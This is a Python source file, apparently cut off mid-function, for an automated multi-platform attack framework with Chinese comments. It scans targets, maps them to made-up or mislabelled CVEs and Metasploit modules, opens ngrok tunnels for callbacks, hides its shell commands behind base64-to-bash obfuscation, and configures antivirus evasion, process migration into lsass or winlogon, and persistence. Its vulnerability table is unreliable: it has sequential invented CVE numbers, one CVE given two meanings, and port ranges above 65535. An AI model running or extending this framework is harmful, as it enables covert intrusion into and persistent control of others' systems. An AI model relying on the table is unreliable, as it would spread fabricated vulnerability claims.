#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import argparse
import xml.etree.ElementTree as ET
import json
import socket
import random
import base64
import platform
import requests
import re
import hashlib
import shutil
import tempfile
import binascii
import string
import threading
import zipfile
import io
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from tqdm import tqdm

# 初始化颜色输出
init(autoreset=True)

# 依赖检测
REQUIRED_TOOLS = [
    "msfvenom", "msfconsole", "nmap", "sqlmap", "nikto", "gobuster", "john",
    "wafw00f", "curl", "whatweb", "nuclei", "adbs", "apktool", "apksigner",
    "powershell", "osslsigncode", "upx", "frida", "objection"
]

def check_kali_and_tools():
    if not os.path.exists("/etc/os-release"):
        print(f"{Fore.RED}[!] 未检测到Linux发行版信息，建议在Kali Linux下运行。{Style.RESET_ALL}")
        sys.exit(1)
    with open("/etc/os-release") as f:
        osinfo = f.read()
        if "kali" not in osinfo.lower():
            print(f"{Fore.RED}[!] 本工具建议在Kali Linux下运行。{Style.RESET_ALL}")
            sys.exit(1)
    missing = []
    for tool in REQUIRED_TOOLS:
        if not shutil.which(tool):
            missing.append(tool)
    if missing:
        print(f"{Fore.RED}[!] 缺少以下依赖工具，请先安装: {', '.join(missing)}{Style.RESET_ALL}")
        sys.exit(1)

# 常量定义
REQUIRED_DIRS = [
    "recon", "scanning", "exploitation", "post_exploit",
    "payloads", "loot", "web", "android",
    "windows", "linux", "macos", "ios",
    "harmonyos", "logs", "screenshots", "reports"
]

# 最新漏洞数据库（包含所有平台）
LATEST_VULNERABILITIES = {
    "windows": {
        "CVE-2024-38080": "Windows Hyper-V 远程代码执行漏洞",
        "CVE-2024-38112": "Windows MSHTML 平台零日漏洞",
        "CVE-2024-30088": "Windows 内核提权漏洞",
        "CVE-2024-29988": "Microsoft Defender 绕过漏洞",
        "CVE-2024-36350": "Windows Kernel 权限提升漏洞",
        "CVE-2024-43532": "Windows Print Spooler 远程代码执行漏洞"
    },
    "macos": {
        "CVE-2024-27834": "Apple Neural Engine 漏洞",
        "CVE-2024-27808": "macOS Gatekeeper 绕过",
        "CVE-2024-27827": "Safari WebKit 内存损坏漏洞",
        "CVE-2024-44243": "macOS Finder 远程代码执行漏洞"
    },
    "linux": {
        "CVE-2024-4040": "Linux 内核权限提升漏洞",
        "CVE-2024-1086": "Netfilter 释放后使用漏洞",
        "CVE-2024-21633": "runc 容器逃逸漏洞",
        "CVE-2024-42516": "Linux Kernel 拒绝服务漏洞",
        "CVE-2024-43204": "Linux Kernel 信息泄露漏洞",
        "CVE-2025-53020": "Linux Samba 远程代码执行漏洞",
        "CVE-2025-2312": "Linux NFS 服务安全绕过漏洞",
        "CVE-2025-38001": "Linux ext4 文件系统提权漏洞",
        "CVE-2024-38531": "Linux Bluetooth 协议栈漏洞",
        "CVE-2024-47174": "Linux OverlayFS 提权漏洞"
    },
    "web": {
        "CVE-2024-3400": "Palo Alto GlobalProtect VPN 漏洞",
        "CVE-2024-3273": "D-Link DNS-320 命令注入",
        "CVE-2024-3148": "Fortinet FortiOS SSL VPN 漏洞",
        "CVE-2024-43204": "Apache HTTP Server 信息泄露漏洞",
        "CVE-2024-43394": "Nginx 拒绝服务漏洞",
        "CVE-2024-42516": "Tomcat 远程代码执行漏洞",
        "CVE-2025-6558": "WordPress 插件跨站脚本漏洞"
    },
    "android": {
        "CVE-2024-3313": "Android Framework 提权漏洞",
        "CVE-2024-29748": "Qualcomm 安全漏洞",
        "CVE-2024-3103": "华为云备份漏洞 (未修复)",
        "CVE-2024-43047": "Android Framework 提权漏洞",
        "CVE-2024-53104": "Android Media Framework 远程代码执行漏洞"
    },
    "ios": {
        "CVE-2024-45000": "iOS IOMobileFramebuffer 内存损坏漏洞",
        "CVE-2024-45001": "Safari WebKit 类型混淆漏洞",
        "CVE-2024-45002": "iMessage 零点击漏洞",
        "CVE-2024-45003": "iOS 内核释放后使用漏洞",
        "CVE-2024-45004": "Apple Neural Engine 提权漏洞"
    },
    "harmonyos": {
        "CVE-2024-46000": "HarmonyOS 系统服务权限提升漏洞",
        "CVE-2024-46001": "鸿蒙分布式能力远程代码执行",
        "CVE-2024-46002": "鸿蒙安全框架绕过漏洞",
        "CVE-2024-46003": "鸿蒙内核提权漏洞",
        "CVE-2024-46004": "鸿蒙应用沙箱逃逸漏洞"
    }
}

class AdvancedPenetrationFramework:
    def __init__(self, target, output_dir="pentest_results", ngrok_auth_token=None,
                 evasion_level=5, proxy=None, stealth_mode=True, time_estimate=True):
        self.target = target
        self.output_dir = output_dir
        self.session_id = f"{random.randint(100000,999999)}"
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.executor = ThreadPoolExecutor(max_workers=50)  # 提升并发数
        self.vulnerabilities = []
        self.successful_exploits = 0
        self.active_sessions = {}
        self.progress = {}
        self.total_tasks = 0
        self.completed_tasks = 0
        self.temp_dir = tempfile.mkdtemp(prefix="pentest_")
        self.start_time = time.time()
        self.progress_bar = None
        self.payload_cache = {}  # 缓存生成的payload
        
        # 平台专用标志
        self.windows_specific = False
        self.linux_specific = False
        self.macos_specific = False
        self.web_specific = False
        self.android_specific = False
        self.ios_specific = False
        self.harmony_specific = False

        self.config = self.initialize_config(ngrok_auth_token, evasion_level, proxy, stealth_mode, time_estimate)
        self.init_environment()
        self.init_logging()

        if self.config["NGROK_AUTH_TOKEN"]:
            self.setup_ngrok()
            
        # 检测目标平台
        self.detect_target_platform()
        
        # 新增智能分析模块
        self.intelligent_analysis()

    def intelligent_analysis(self):
        """新增智能目标分析模块"""
        self.log("启动智能目标分析...", "INFO")
        
        # 网络拓扑分析
        self.analyze_network_topology()
        
        # 服务指纹深度分析
        self.deep_service_fingerprinting()
        
        # 威胁建模
        self.threat_modeling()
        
        # 攻击路径规划
        self.attack_path_planning()

    def analyze_network_topology(self):
        """分析目标网络拓扑"""
        self.log("分析目标网络拓扑...", "INFO")
        
        # 使用traceroute分析网络路径
        traceroute_cmd = f"traceroute -n -m 15 {self.target}"
        result = self.run_command(traceroute_cmd, category="recon", filename="traceroute.txt")
        
        # 分析网络跳数
        if result:
            hops = len([line for line in result.split('\n') if line.strip()])
            self.log(f"目标网络跳数: {hops}", "INFO")
            
            # 检测云服务提供商
            cloud_providers = ["aws", "azure", "gcp", "aliyun", "huawei"]
            for provider in cloud_providers:
                if provider in result.lower():
                    self.log(f"检测到云服务提供商: {provider.upper()}", "INFO")
                    break
        
        # 检测CDN
        cdn_detection_cmd = f"curl -I {self.target} -H 'Host: {self.target}'"
        cdn_result = self.run_command(cdn_detection_cmd, category="recon", filename="cdn_detection.txt")
        if cdn_result and any(keyword in cdn_result.lower() for keyword in ["cloudflare", "akamai", "fastly"]):
            self.log("检测到CDN服务", "WARNING")

    def deep_service_fingerprinting(self):
        """深度服务指纹分析"""
        self.log("执行深度服务指纹分析...", "INFO")
        
        # 使用更精确的指纹识别技术
        advanced_fingerprint_cmds = [
            f"nmap -sV --version-intensity 9 -p- -T4 {self.target} -oN {self.output_dir}/recon/advanced_fingerprinting.txt",
            f"whatweb -a 3 -v {self.target}",
            f"wappalyzer {self.target}"
        ]
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(self.run_command, cmd, category="recon") for cmd in advanced_fingerprint_cmds]
            for future in as_completed(futures):
                future.result()

    def threat_modeling(self):
        """威胁建模分析"""
        self.log("执行威胁建模分析...", "INFO")
        
        # 基于检测到的服务评估威胁级别
        threat_level = "medium"
        
        # 检查高风险服务
        high_risk_services = ["rdp", "smb", "telnet", "vnc"]
        for service in high_risk_services:
            if service in str(self.vulnerabilities).lower():
                threat_level = "high"
                break
                
        self.log(f"初步威胁级别评估: {threat_level}", "INFO")
        
        # 生成威胁矩阵
        threat_matrix = {
            "network": threat_level,
            "application": threat_level,
            "data": threat_level,
            "access": threat_level
        }
        
        # 保存威胁模型
        with open(os.path.join(self.output_dir, "recon", "threat_model.json"), "w") as f:
            json.dump(threat_matrix, f)

    def attack_path_planning(self):
        """攻击路径规划"""
        self.log("规划最优攻击路径...", "INFO")
        
        # 基于漏洞严重性和利用难度排序
        if len(self.vulnerabilities) > 0:
            sorted_vulns = sorted(self.vulnerabilities, 
                                 key=lambda x: (x["criticality"] == "high", x["criticality"] == "medium"), 
                                 reverse=True)
            
            attack_path = []
            for vuln in sorted_vulns[:3]:  # 取前三个最可能成功的攻击路径
                attack_path.append({
                    "target": f"{self.target}:{vuln['port']}",
                    "service": vuln["service"],
                    "vulnerability": vuln["type"],
                    "exploit": self.get_exploit_method(vuln["type"])
                })
            
            # 保存攻击路径
            with open(os.path.join(self.output_dir, "recon", "attack_path.json"), "w") as f:
                json.dump(attack_path, f)
                
            self.log(f"生成 {len(attack_path)} 条优先攻击路径", "SUCCESS")

    def get_exploit_method(self, vuln_type):
        """获取漏洞利用方法"""
        exploit_methods = {
            "CVE-2024-43532": "exploit/windows/smb/cve_2024_43532",
            "CVE-2024-42516": "exploit/multi/http/tomcat_cve_2024_42516",
            "CVE-2024-53104": "exploit/android/media/cve_2024_53104",
            "CVE-2024-45002": "exploit/apple_ios/imessage/cve_2024_45002"
        }
        return exploit_methods.get(vuln_type, "需手动确定利用方法")

    def detect_target_platform(self):
        """自动检测目标平台"""
        self.log("开始目标平台检测...", "INFO")
        
        # Windows检测
        windows_ports = ["135", "139", "445", "3389"]
        windows_result = self.run_command(f"nmap -p {','.join(windows_ports)} {self.target}", save_output=False)
        if "microsoft-ds" in windows_result or "ms-wbt-server" in windows_result:
            self.windows_specific = True
            self.log("检测到Windows系统，启用专用模块", "INFO")
        
        # Linux检测
        linux_ports = ["22", "111", "2049"]
        linux_result = self.run_command(f"nmap -p {','.join(linux_ports)} {self.target}", save_output=False)
        if "ssh" in linux_result or "rpcbind" in linux_result:
            self.linux_specific = True
            self.log("检测到Linux系统，启用专用模块", "INFO")
        
        # macOS检测
        mac_ports = ["3283", "5900", "22"]
        mac_result = self.run_command(f"nmap -p {','.join(mac_ports)} {self.target}", save_output=False)
        if "vnc" in mac_result or "apple-iphoto" in mac_result:
            self.macos_specific = True
            self.log("检测到macOS系统，启用专用模块", "INFO")
        
        # Web检测
        web_ports = ["80", "443", "8080"]
        web_result = self.run_command(f"nmap -p {','.join(web_ports)} {self.target}", save_output=False)
        if "http" in web_result:
            self.web_specific = True
            self.log("检测到Web服务，启用专用模块", "INFO")
        
        # Android检测
        android_ports = ["5555", "5037"]
        android_result = self.run_command(f"nmap -p {','.join(android_ports)} {self.target}", save_output=False)
        if "adb" in android_result or "android" in android_result.lower():
            self.android_specific = True
            self.log("检测到Android设备，启用专用模块", "INFO")
        
        # iOS检测
        ios_ports = ["62078", "5223", "443"]
        ios_result = self.run_command(f"nmap -p {','.join(ios_ports)} {self.target}", save_output=False)
        if "iphone-sync" in ios_result or "apns" in ios_result:
            self.ios_specific = True
            self.log("检测到iOS设备，启用专用模块", "INFO")
            
        # HarmonyOS检测
        if "harmony" in self.target.lower() or "鸿蒙" in self.target.lower():
            self.harmony_specific = True
            self.log("检测到HarmonyOS设备，启用专用模块", "INFO")
        elif "huawei" in self.target.lower() or "麦芒" in self.target.lower():
            self.harmony_specific = True
            self.log("检测到华为设备，启用HarmonyOS专用模块", "INFO")

    def initialize_config(self, ngrok_auth_token, evasion_level, proxy, stealth_mode, time_estimate):
        return {
            "LHOST": self.get_obfuscated_ip(stealth_mode),
            "PUBLIC_IP": None,
            "NGROK_AUTH_TOKEN": ngrok_auth_token,
            "PORTS": self.generate_random_ports(),
            "ENCRYPTION": self.generate_encryption_keys(),
            "SLEEP_INTERVAL": random.randint(30, 120),
            "MIGRATION": self.get_migration_processes(),
            "EVASION_LEVEL": evasion_level,
            "STEALTH_MODE": stealth_mode,
            "NGROK_TUNNELS": {},
            "PROXY": proxy,
            "ANTIVIRUS_EVASION": True,
            "PERSISTENCE_METHODS": {
                "windows": 3, "linux": 3, "macos": 2, 
                "android": 2, "ios": 2, "harmonyos": 2
            },
            "SESSION_ENCRYPTION": True,
            "TIME_ESTIMATE": time_estimate,
            "WAF_BYPASS": True,
            "FIREWALL_EVASION": True,
            "ARCH": None,  # 目标架构
            "LATEST_EXPLOITS": True,  # 启用最新漏洞利用
            "ADVANCED_EVASION": True,  # 高级规避技术
            "PLATFORM_MODULES": {  # 平台专用模块状态
                "windows": False,
                "linux": False,
                "macos": False,
                "web": False,
                "android": False,
                "ios": False,
                "harmonyos": False
            },
            "INTELLIGENT_ANALYSIS": True  # 新增智能分析标志
        }

    # --------------------------
    # 基础工具函数
    # --------------------------
    def get_obfuscated_ip(self, stealth_mode):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            if stealth_mode:
                parts = ip.split('.')
                return f"{parts[0]}.{int(parts[1])+1}.{parts[2]}.{int(parts[3])-1}"
            return ip
        except Exception:
            return "127.0.0.1"

    def generate_random_ports(self):
        return {
            "windows": random.randint(10000, 20000),
            "linux": random.randint(20001, 30000),
            "android": random.randint(30001, 40000),
            "macos": random.randint(40001, 50000),
            "web": random.randint(50001, 60000),
            "ios": random.randint(60001, 70000),
            "harmonyos": random.randint(70001, 80000)
        }

    def generate_encryption_keys(self):
        return {
            "windows": self.generate_encryption_key(32),
            "linux": self.generate_encryption_key(24),
            "android": self.generate_encryption_key(16),
            "macos": self.generate_encryption_key(32),
            "ios": self.generate_encryption_key(24),
            "harmonyos": self.generate_encryption_key(32)
        }

    def generate_encryption_key(self, length):
        chars = string.ascii_letters + string.digits + "!@#$%^&*()"
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    def get_migration_processes(self):
        return {
            "windows": self.get_random_windows_process(),
            "linux": self.get_random_linux_process(),
            "android": "com.android.systemui",
            "macos": self.get_random_macos_process(),
            "ios": "com.apple.WebKit.Networking",
            "harmonyos": "com.huawei.systemmanager"
        }

    def get_random_windows_process(self):
        return random.choice(["explorer.exe", "svchost.exe", "winlogon.exe", "csrss.exe", "lsass.exe"])

    def get_random_linux_process(self):
        return random.choice(["systemd", "sshd", "dbus-daemon", "NetworkManager", "cron"])

    def get_random_macos_process(self):
        return random.choice(["WindowServer", "launchd", "kernel_task", "mDNSResponder", "cfprefsd"])

    def generate_random_filename(self, length=12, extension=None):
        chars = string.ascii_lowercase + string.digits
        name = ''.join(random.choice(chars) for _ in range(length))
        return f"{name}.{extension}" if extension else name

    # --------------------------
    # 环境初始化
    # --------------------------
    def init_environment(self):
        for dir_name in REQUIRED_DIRS:
            dir_path = os.path.join(self.output_dir, dir_name)
            os.makedirs(dir_path, exist_ok=True)

    def init_logging(self):
        self.log_file = os.path.join(self.output_dir, "logs", "pentest.log")
        # 简化日志：只在文件开头写入基本信息
        with open(self.log_file, "w", encoding="utf-8") as f:
            f.write(f"=== 测试会话开始 {self.timestamp} ===\n")
            f.write(f"目标: {self.target}\n")
            f.write(f"本地IP: {self.config['LHOST']}\n")
            f.write(f"会话ID: {self.session_id}\n\n")

    def log(self, message, level="INFO"):
        # 简化日志：只记录错误和关键事件
        if level in ["ERROR", "VULN", "SUCCESS", "CRITICAL"]:
            colors = {
                "SUCCESS": Fore.GREEN,
                "WARNING": Fore.YELLOW, 
                "ERROR": Fore.RED,
                "VULN": Fore.MAGENTA,
                "CRITICAL": Fore.CYAN
            }
            color = colors.get(level, Fore.WHITE)
            msg = message
            if self.config["STEALTH_MODE"]:
                msg = re.sub(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', '[REDACTED]', msg)
            log_entry = f"[{datetime.now()}] [{level}] {msg}"
            print(f"{color}{log_entry}{Style.RESET_ALL}")
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"{log_entry}\n")

    # --------------------------
    # 网络通信模块
    # --------------------------
    def setup_ngrok(self):
        self.log("正在设置Ngrok隧道...", "INFO")
        try:
            if not shutil.which("ngrok"):
                self.install_ngrok()
            auth_cmd = f"ngrok config add-authtoken {self.config['NGROK_AUTH_TOKEN']}"
            self.run_command(auth_cmd, save_output=False)
            for os_type, port in self.config["PORTS"].items():
                if os_type != "web":
                    self.start_ngrok_tunnel(os_type, port)
            if self.config["NGROK_TUNNELS"]:
                self.config["PUBLIC_IP"] = next(iter(self.config["NGROK_TUNNELS"].values()))["public_host"]
        except Exception as e:
            self.log(f"Ngrok设置失败: {str(e)}", "ERROR")

    def install_ngrok(self):
        cmds = [
            "curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null",
            "echo \"deb https://ngrok-agent.s3.amazonaws.com buster main\" | sudo tee /etc/apt/sources.list.d/ngrok.list",
            "sudo apt update -qq",
            "sudo apt install -y ngrok"
        ]
        for cmd in cmds:
            self.run_command(cmd, save_output=False)

    def start_ngrok_tunnel(self, os_type, port):
        region = random.choice(["us", "eu", "ap", "au"])
        log_file = os.path.join(self.temp_dir, f"ngrok_{os_type}.log")
        cmd = (
            f"tmux new-session -d -s ngrok_{os_type} "
            f"'ngrok tcp {port} --region={region} --log=stdout > {log_file}'"
        )
        self.run_command(cmd, save_output=False)
        time.sleep(5)
        tunnel_info = self.get_ngrok_tunnel_info(port)
        if tunnel_info:
            self.config["NGROK_TUNNELS"][os_type] = tunnel_info
            self.log(f"{os_type}隧道建立成功: {tunnel_info['public_url']}", "SUCCESS")

    def get_ngrok_tunnel_info(self, port, retries=5):
        """增加重试次数，提升获取成功率"""
        for _ in range(retries):
            try:
                resp = requests.get("http://localhost:4040/api/tunnels", timeout=5)
                if resp.status_code == 200:
                    tunnels = resp.json().get("tunnels", [])
                    for tunnel in tunnels:
                        if str(port) in tunnel["config"]["addr"]:
                            public_url = tunnel["public_url"]
                            host = public_url.split("//")[1].split(":")[0]
                            port_num = public_url.split(":")[2]
                            return {
                                "public_url": public_url,
                                "public_host": host,
                                "public_port": port_num
                            }
                time.sleep(2)
            except Exception:
                time.sleep(2)
        return None

    # --------------------------
    # 命令执行模块
    # --------------------------
    def run_command(self, cmd, category="scanning", filename=None, timeout=900, save_output=True, retries=3):
        """增加重试机制，提升成功率"""
        last_exception = None
        for attempt in range(retries):
            try:
                if self.config["EVASION_LEVEL"] > 1:
                    cmd = self.obfuscate_command(cmd)
                result = subprocess.run(
                    cmd, shell=True, check=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    text=True, timeout=timeout
                )
                if save_output:
                    output = self.format_command_output(cmd, result)
                    filename = filename or f"{cmd.split()[0]}_{self.timestamp}.txt"
                    filename = re.sub(r'[^\w\-_.]', '_', filename)[:100]
                    output_path = os.path.join(self.output_dir, category, filename)
                    with open(output_path, "w", encoding="utf-8") as f:
                        f.write(output)
                return result.stdout
            except subprocess.TimeoutExpired:
                self.log(f"命令超时: {cmd}", "WARNING")
                last_exception = "timeout"
            except subprocess.CalledProcessError as e:
                error_msg = f"命令失败: {e}\n错误输出:\n{e.stderr}"
                self.log(error_msg, "ERROR")
                last_exception = e
            except Exception as e:
                self.log(f"执行命令异常: {str(e)}", "ERROR")
                last_exception = e
            time.sleep(2)  # 每次重试间隔
        return None

    def format_command_output(self, cmd, result):
        output = f"命令: {cmd}\n输出:\n{result.stdout}"
        if result.stderr:
            output += f"\n错误:\n{result.stderr}"
        return output

    def obfuscate_command(self, cmd):
        if self.config["EVASION_LEVEL"] == 2:
            parts = cmd.split()
            if len(parts) > 3:
                var_name = f"cmd{random.randint(1,9)}"
                return f"{var_name}=\"{parts[0]}\"; ${var_name} {' '.join(parts[1:])}"
        elif self.config["EVASION_LEVEL"] >= 3:
            encoded_cmd = base64.b64encode(cmd.encode()).decode()
            return f"echo {encoded_cmd} | base64 -d | bash"
        return cmd

    # --------------------------
    # 扫描与漏洞检测模块
    # --------------------------
    def scan_target(self):
        self.start_time = time.time()
        self.total_tasks = 10
        self.progress_bar = tqdm(total=self.total_tasks, desc="整体进度", unit="任务")
        try:
            # 并发优化：所有扫描任务最大并发
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [
                    executor.submit(self.fingerprint_target),
                    executor.submit(self.run_nmap_scan)
                ]
                for future in as_completed(futures):
                    future.result()
            self.update_progress("初始扫描", 20)
            
            # 解析nmap结果
            nmap_xml = f"{self.output_dir}/scanning/nmap_full.xml"
            if os.path.exists(nmap_xml):
                self.parse_nmap_results(nmap_xml)
                self.update_progress("结果解析", 30)
                
                # 识别服务并并行扫描
                open_ports = len(self.vulnerabilities)
                self.total_tasks += open_ports
                self.progress_bar.total = self.total_tasks
                
                # 并行执行服务扫描
                with ThreadPoolExecutor(max_workers=20) as executor:
                    futures = []
                    for i, vuln in enumerate(self.vulnerabilities):
                        if vuln["service"].lower() in ["http", "https"]:
                            futures.append(
                                executor.submit(
                                    self.test_web_service, 
                                    vuln["port"],
                                    i,
                                    len(self.vulnerabilities))
                            )
                    for future in as_completed(futures):
                        future.result()
                
                self.update_progress("服务扫描", 60)
                
                # 并行执行漏洞利用
                exploit_futures = []
                with ThreadPoolExecutor(max_workers=10) as executor:
                    for i, vuln in enumerate(self.vulnerabilities):
                        if vuln["criticality"] == "high":
                            exploit_futures.append(
                                executor.submit(
                                    self.exploit_vulnerability, 
                                    vuln["port"], 
                                    vuln["service"], 
                                    vuln["version"],
                                    i,
                                    len(self.vulnerabilities))
                            )
                    for future in as_completed(exploit_futures):
                        if future.result():
                            self.successful_exploits += 1
                
                self.update_progress("漏洞利用", 80)
                
                # 持久化部署
                persistence_futures = []
                if self.active_sessions:
                    self.total_tasks += len(self.active_sessions)
                    self.progress_bar.total = self.total_tasks
                    
                    with ThreadPoolExecutor(max_workers=5) as executor:
                        for j, os_type in enumerate(self.active_sessions.keys()):
                            persistence_futures.append(
                                executor.submit(
                                    self.deploy_persistence, 
                                    os_type,
                                    j,
                                    len(self.active_sessions)))
                        
                        for future in as_completed(persistence_futures):
                            future.result()
                
                self.update_progress("持久化部署", 90)
                
                # 后渗透操作
                self.post_exploitation()
                self.update_progress("后渗透操作", 95)
                
        except Exception as e:
            self.log(f"扫描过程中出错: {str(e)}", "ERROR")
        finally:
            self.generate_report()
            self.update_progress("报告生成", 100)
            self.progress_bar.close()

    def fingerprint_target(self):
        # 并行执行指纹识别任务
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [
                executor.submit(
                    self.run_command, 
                    f"whatweb -v {self.target}", 
                    category="recon", 
                    filename="whatweb.txt"
                ),
                executor.submit(
                    self.run_command, 
                    f"nuclei -u {self.target} -silent -j -o {self.output_dir}/recon/nuclei.json", 
                    category="recon"
                ),
                executor.submit(
                    self.run_command, 
                    f"nmap -sV --script=banner -p- -T4 {self.target} -oN {self.output_dir}/recon/banner.txt", 
                    category="recon"
                )
            ]
            for future in as_completed(futures):
                future.result()
                
        # 平台专用指纹识别
        if self.windows_specific:
            self.run_command(f"nmap -p 135,139,445 --script smb-os-discovery {self.target}", category="windows")
        if self.linux_specific:
            self.run_command(f"nmap -p 22 --script ssh-hostkey {self.target}", category="linux")
        if self.macos_specific:
            self.run_command(f"nmap -p 3283 --script vnc-info {self.target}", category="macos")
        if self.web_specific:
            self.run_command(f"wafw00f {self.target}", category="web")
        if self.android_specific:
            self.run_command(f"adb shell getprop ro.product.model", category="android", filename="android_model.txt")
        if self.ios_specific:
            self.run_command(f"nmap -p 62078 --script iphone-sync-info {self.target}", category="ios")
        if self.harmony_specific:
            self.run_command(f"adb shell getprop ro.build.version.harmony", category="harmonyos", filename="harmony_version.txt")

    def run_nmap_scan(self):
        # 优化nmap命令：使用更快速的扫描选项
        nmap_cmd = self.evade_firewall(
            f"nmap -sS -T4 --top-ports 1000 "  # 先扫描最常见端口
            f"-oX {self.output_dir}/scanning/nmap_quick.xml {self.target}"
        )
        self.run_command(nmap_cmd, category="scanning", filename="nmap_quick.txt")
        
        # 解析快速扫描结果以确定开放端口
        open_ports = self.parse_open_ports(f"{self.output_dir}/scanning/nmap_quick.xml")
        
        if open_ports:
            # 仅对开放端口进行详细扫描
            ports_str = ",".join(open_ports)
            nmap_cmd = self.evade_firewall(
                f"nmap -sS -sV -sC -O -A -p {ports_str} --script vuln "
                f"-oX {self.output_dir}/scanning/nmap_full.xml {self.target}"
            )
            self.run_command(nmap_cmd, category="scanning", filename="nmap_full.txt")
        else:
            self.log("未发现开放端口，跳过详细扫描", "WARNING")

    def parse_open_ports(self, xml_file):
        """从nmap XML结果中提取开放端口"""
        open_ports = []
        try:
            # 修复XML解析：处理可能的格式问题
            with open(xml_file, 'r', encoding='utf-8') as f:
                xml_content = f.read()
                # 移除可能导致解析错误的控制字符
                xml_content = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f]', '', xml_content)
            
            root = ET.fromstring(xml_content)
            for host in root.findall("host"):
                for port in host.findall("ports/port"):
                    state = port.find("state")
                    if state is not None and state.get("state") == "open":
                        port_num = port.get("portid")
                        open_ports.append(port_num)
            return open_ports
        except ET.ParseError as e:
            self.log(f"解析Nmap XML文件失败: {str(e)}", "ERROR")
            return []
        except Exception as e:
            self.log(f"提取开放端口失败: {str(e)}", "ERROR")
            return []

    def parse_nmap_results(self, xml_file):
        try:
            # 修复XML解析：处理可能的格式问题
            with open(xml_file, 'r', encoding='utf-8') as f:
                xml_content = f.read()
                # 移除可能导致解析错误的控制字符
                xml_content = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f]', '', xml_content)
            
            root = ET.fromstring(xml_content)
            for host in root.findall("host"):
                for port in host.findall("ports/port"):
                    state = port.find("state")
                    if state is not None and state.get("state") == "open":
                        port_num = port.get("portid")
                        service_elem = port.find("service")
                        service = service_elem.get("name", "unknown") if service_elem is not None else "unknown"
                        product = service_elem.get("product", "") if service_elem is not None else ""
                        version = service_elem.get("version", "") if service_elem is not None else ""
                        self.log(f"发现开放端口: {port_num}/{service} {product} {version}", "INFO")
                        
                        # 检查最新漏洞（已更新新漏洞检测）
                        if service.lower() == "smb" and version:
                            if "spooler" in version.lower() and "CVE-2024-43532" in LATEST_VULNERABILITIES["windows"]:
                                self.log(f"检测到Windows打印后台程序服务，可能存在CVE-2024-43532漏洞", "VULN")
                                self.log_vulnerability(
                                    "CVE-2024-43532",
                                    f"Windows Print Spooler 远程代码执行漏洞",
                                    "high",
                                    port_num,
                                    service,
                                    version
                                )
                                
                        if service.lower() == "http" and "apache" in version.lower():
                            if "2.4" in version and "CVE-2024-43204" in LATEST_VULNERABILITIES["web"]:
                                self.log(f"检测到Apache 2.4，可能存在CVE-2024-43204信息泄露漏洞", "VULN")
                                self.log_vulnerability(
                                    "CVE-2024-43204",
                                    f"Apache HTTP Server 信息泄露漏洞",
                                    "high",
                                    port_num,
                                    service,
                                    version
                                )
                                
                        if service.lower() == "http" and "tomcat" in version.lower():
                            if "10.1" in version and "CVE-2024-42516" in LATEST_VULNERABILITIES["web"]:
                                self.log(f"检测到Tomcat 10.1，可能存在CVE-2024-42516远程代码执行漏洞", "VULN")
                                self.log_vulnerability(
                                    "CVE-2024-42516",
                                    f"Tomcat 远程代码执行漏洞",
                                    "critical",
                                    port_num,
                                    service,
                                    version
                                )
                        
                        # 通用漏洞检查
                        for platform in ["windows", "linux", "macos", "web", "android", "ios", "harmonyos"]:
                            for cve, desc in LATEST_VULNERABILITIES[platform].items():
                                if product.lower() in desc.lower() or service.lower() in desc.lower():
                                    self.log(f"检测到潜在漏洞: {cve} - {desc}", "VULN")
                                    self.log_vulnerability(
                                        cve,
                                        f"潜在漏洞: {desc}",
                                        "high",
                                        port_num,
                                        service,
                                        version
                                    )
                        
                        for script in port.findall("script"):
                            script_id = script.get("id", "")
                            if "vuln" in script_id:
                                output = script.get("output", "")
                                criticality = "high" if "VULNERABLE" in output else "medium"
                                self.log_vulnerability(
                                    script_id,
                                    output,
                                    criticality,
                                    port_num,
                                    service,
                                    version
                                )
        except ET.ParseError as e:
            self.log(f"解析Nmap XML文件失败: {str(e)}", "ERROR")
        except Exception as e:
            self.log(f"解析Nmap结果失败: {str(e)}", "ERROR")

    def log_vulnerability(self, vuln_type, details, criticality, port, service, version):
        vuln = {
            "type": vuln_type,
            "details": details,
            "criticality": criticality,
            "port": port,
            "service": service,
            "version": version,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "target": self.target
        }
        self.vulnerabilities.append(vuln)
        self.log(f"发现漏洞: {vuln_type} (严重性: {criticality})", "VULN")

    def test_web_service(self, port, current, total):
        """并行测试web服务"""
        protocol = "https" if str(port) == "443" else "http"
        base_url = f"{protocol}://{self.target}:{port}"
        
        # 并行执行web扫描任务
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [
                executor.submit(
                    self.run_command,
                    f"nuclei -u {base_url} -silent -j -o {self.output_dir}/web/nuclei_{port}.json",
                    category="web"
                ),
                executor.submit(
                    self.run_command,
                    f"nikto -h {base_url} -Format json -output {self.output_dir}/web/nikto_{port}.json",
                    category="web"
                ),
                executor.submit(
                    self.run_command,
                    f"gobuster dir -u {base_url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o {self.output_dir}/web/gobuster_{port}.txt",
                    category="web"
                )
            ]
            for future in as_completed(futures):
                future.result()
        
        # 更新进度
        progress = 30 + int(50 * (current+1)/total)
        self.update_progress(f"Web服务扫描(端口{port})", progress)

    # --------------------------
    # 漏洞利用模块
    # --------------------------
    def exploit_vulnerability(self, port, service, version, current, total):
        exploit_func = {
            "http": self.exploit_web_service,
            "https": self.exploit_web_service,
            "smb": self.exploit_smb_service,
            "ftp": self.exploit_ftp_service,
            "ssh": self.exploit_ssh_service,
            "ms-wbt-server": self.enable_rdp,
            "adb": self.exploit_adb_service,
            "iphone-sync": self.exploit_ios_service
        }.get(service.lower(), None)
        
